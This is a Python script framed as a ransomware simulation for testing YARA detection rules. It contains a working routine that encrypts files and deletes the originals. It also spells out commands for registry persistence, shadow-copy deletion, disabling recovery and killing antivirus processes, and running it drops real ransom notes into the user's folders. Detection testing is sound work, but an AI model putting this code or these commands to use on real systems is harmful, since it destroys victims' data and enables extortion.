#!/usr/bin/env python3
"""
Ransomware Simulation Script
Test file for YARA ransomware detection rules
Contains patterns commonly found in ransomware
"""

import os
import glob
import base64
import hashlib
from cryptography.fernet import Fernet

class RansomwareSimulator:
    def __init__(self):
        self.encryption_key = Fernet.generate_key()
        self.cipher_suite = Fernet(self.encryption_key)
        self.ransom_note = """
        ╔══════════════════════════════════════════════╗
        ║            YOUR FILES ARE ENCRYPTED!         ║
        ╚══════════════════════════════════════════════╝
        
        All your important files have been encrypted!
        
        To decrypt your files, you need to pay 0.5 Bitcoin to:
        1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2
        
        After payment, contact us at: recovery@darkweb.onion
        
        DO NOT TRY TO REMOVE THIS SOFTWARE OR RUN ANTIVIRUS!
        This will result in permanent data loss!
        
        You have 72 hours to pay or the decryption key will be deleted!
        
        Current time remaining: 71:45:32
        
        ═══════════════════════════════════════════════
        """
        
        # File extensions to target
        self.target_extensions = [
            '.doc', '.docx', '.pdf', '.txt', '.jpg', '.jpeg', '.png', 
            '.gif', '.mp4', '.avi', '.mp3', '.wav', '.zip', '.rar',
            '.xls', '.xlsx', '.ppt', '.pptx', '.sql', '.db'
        ]
        
        # Directories to encrypt
        self.target_directories = [
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/Pictures"),
            os.path.expanduser("~/Videos"),
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/Downloads")
        ]

    def find_target_files(self):
        """Find all files with target extensions"""
        target_files = []
        
        for directory in self.target_directories:
            if os.path.exists(directory):
                for extension in self.target_extensions:
                    pattern = os.path.join(directory, f"**/*{extension}")
                    files = glob.glob(pattern, recursive=True)
                    target_files.extend(files)
        
        return target_files

    def encrypt_file(self, file_path):
        """Encrypt a single file"""
        try:
            with open(file_path, 'rb') as file:
                file_data = file.read()
            
            encrypted_data = self.cipher_suite.encrypt(file_data)
            
            # Write encrypted data with .locked extension
            encrypted_path = file_path + '.locked'
            with open(encrypted_path, 'wb') as encrypted_file:
                encrypted_file.write(encrypted_data)
            
            # Delete original file
            os.remove(file_path)
            
            return True
        except Exception as e:
            print(f"Failed to encrypt {file_path}: {e}")
            return False

    def create_ransom_note(self, directory):
        """Create ransom note in directory"""
        note_path = os.path.join(directory, "READ_ME_FOR_DECRYPT.txt")
        
        try:
            with open(note_path, 'w') as note_file:
                note_file.write(self.ransom_note)
            
            # Also create HTML version
            html_note_path = os.path.join(directory, "READ_ME_FOR_DECRYPT.html")
            html_content = f"""
            <html>
            <head><title>Your files are encrypted!</title></head>
            <body style="background-color: red; color: white; font-family: Arial;">
            <h1>🔒 YOUR FILES ARE ENCRYPTED! 🔒</h1>
            <pre>{self.ransom_note}</pre>
            </body>
            </html>
            """
            
            with open(html_note_path, 'w') as html_note:
                html_note.write(html_content)
                
        except Exception as e:
            print(f"Failed to create ransom note in {directory}: {e}")

    def modify_registry(self):
        """Modify Windows registry for persistence"""
        registry_commands = [
            'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsSecurity" /t REG_SZ /d "C:\\temp\\ransomware.exe" /f',
            'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemUpdate" /t REG_SZ /d "C:\\temp\\ransomware.exe" /f',
            'reg delete "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Windows Defender" /f',
            'reg add "HKCU\\Software\\Classes\\exefile\\shell\\open\\command" /ve /t REG_SZ /d "C:\\temp\\ransomware.exe" /f'
        ]
        
        for cmd in registry_commands:
            print(f"Executing: {cmd}")
            # os.system(cmd)  # Commented out for safety

    def disable_security_tools(self):
        """Attempt to disable security tools"""
        security_processes = [
            "MsMpEng.exe",  # Windows Defender
            "avgnt.exe",    # Avira
            "avguard.exe",  # Avira
            "avp.exe",      # Kaspersky
            "mcshield.exe", # McAfee
            "windefend",    # Windows Defender Service
            "wscsvc",       # Security Center Service
        ]
        
        for process in security_processes:
            print(f"Attempting to terminate: {process}")
            # os.system(f"taskkill /f /im {process}")  # Commented out for safety

    def network_communication(self):
        """Communicate with C&C server"""
        c2_servers = [
            "ransomware-c2.onion:8080",
            "payment-server.darkweb:443",
            "192.168.1.100:9999"
        ]
        
        victim_info = {
            "computer_name": os.environ.get('COMPUTERNAME', 'Unknown'),
            "username": os.environ.get('USERNAME', 'Unknown'),
            "encryption_key": base64.b64encode(self.encryption_key).decode(),
            "file_count": len(self.find_target_files()),
            "victim_id": hashlib.md5(os.environ.get('COMPUTERNAME', 'Unknown').encode()).hexdigest()
        }
        
        for server in c2_servers:
            print(f"Reporting to C&C: {server}")
            print(f"Victim info: {victim_info}")

    def change_wallpaper(self):
        """Change desktop wallpaper to ransom message"""
        wallpaper_message = """
        YOUR COMPUTER HAS BEEN ENCRYPTED!
        
        Pay 0.5 Bitcoin to recover your files!
        
        Bitcoin Address: 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2
        
        Time remaining: 71:45:32
        """
        
        print("Changing desktop wallpaper...")
        print(wallpaper_message)

    def delete_shadow_copies(self):
        """Delete Windows shadow copies"""
        shadow_commands = [
            "vssadmin delete shadows /all /quiet",
            "wbadmin delete catalog -quiet",
            "bcdedit /set {default} bootstatuspolicy ignoreallfailures",
            "bcdedit /set {default} recoveryenabled no"
        ]
        
        for cmd in shadow_commands:
            print(f"Executing: {cmd}")
            # os.system(cmd)  # Commented out for safety

    def run_simulation(self):
        """Run the complete ransomware simulation"""
        print("🔴 RANSOMWARE SIMULATION STARTED 🔴")
        print("This is a test simulation for detection purposes!")
        print("=" * 50)
        
        print("[1] Disabling security tools...")
        self.disable_security_tools()
        
        print("[2] Establishing persistence...")
        self.modify_registry()
        
        print("[3] Deleting shadow copies...")
        self.delete_shadow_copies()
        
        print("[4] Finding target files...")
        target_files = self.find_target_files()
        print(f"Found {len(target_files)} target files")
        
        print("[5] Simulating file encryption...")
        # Note: Not actually encrypting for safety
        for file_path in target_files[:5]:  # Only simulate first 5 files
            print(f"Would encrypt: {file_path}")
        
        print("[6] Creating ransom notes...")
        for directory in self.target_directories:
            if os.path.exists(directory):
                self.create_ransom_note(directory)
        
        print("[7] Changing wallpaper...")
        self.change_wallpaper()
        
        print("[8] Contacting C&C servers...")
        self.network_communication()
        
        print("🔴 RANSOMWARE SIMULATION COMPLETED 🔴")
        print("All activities were simulated for testing purposes!")

if __name__ == "__main__":
    # Warning message
    print("WARNING: This is a ransomware simulation for testing YARA detection!")
    print("No actual encryption will be performed.")
    print("This file should trigger multiple YARA rules.")
    print()
    
    # Create and run simulator
    simulator = RansomwareSimulator()
    simulator.run_simulation()
